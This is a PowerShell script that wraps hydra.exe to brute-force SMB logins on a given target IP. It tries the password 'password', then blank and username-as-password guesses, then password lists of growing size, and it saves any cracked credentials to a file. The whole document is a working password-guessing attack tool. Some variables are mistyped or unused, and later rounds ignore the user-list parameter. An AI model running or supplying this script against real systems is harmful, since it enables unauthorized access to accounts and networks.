$ProgressPreference = 'SilentlyContinue'	
   
# Input Switches
[CmdletBinding()]
Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Users list')]
    [string]$UserList,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Enter Domain')]
    [string]$Domain,
    
    [Parameter(Mandatory = $true,
    HelpMessage = 'Target IP')]
    [string]$Target,
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Custom Password list')]
    [string]$PassList     
)

# these are the variables to use in the script
$global:domain2=$Domain
$global:target2=$Target
$global:userlist2=$UserList
$global:passlist=$PassList

if (!$domain2) { 
# if no domain is given then set it to a '.' 
$global:domain2="."
}

if (!$userlist2) { 
$global:userlist2="users.txt"
}


function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  


####################################
# Hydra
####################################
function hydra-check-cracked {
Get-Content .\hydra_brute.log | findstr "\[smb\]" | sort-object| Get-Unique > hydra_brute_cracked.txt
Get-Content .\hydra_brute_cracked.txt
}

function hydra-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
hydra.exe -L $userlist2 -p password $target2 smb >> hydra_brute.log #2>$nul
Write-Output ""
hydra-check-cracked
}
function hydra-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt + blank + user=pass "
Write-Output ""
hydra.exe -L $userlist2 -P .\pass5.txt -e snr $target2 smb >> hydra_brute.log	#2>$nul
Write-Output ""
hydra-check-cracked
}
function hydra-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt "
Write-Output ""
hydra.exe -L .\users.txt -P .\pass10.txt $target2 smb >> hydra_brute.log #2>$nul
Write-Output ""
hydra-check-cracked
}
function hydra-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt "
Write-Output ""
hydra.exe -L .\users.txt -P .\pass100.txt $target2 smb >> hydra_brute.log #2>$nul	
Write-Output ""
hydra-check-cracked
}







echo "" > .\hydra_brute.log
debug
hydra-password
hydra-pass5
hydra-pass10
hydra-pass100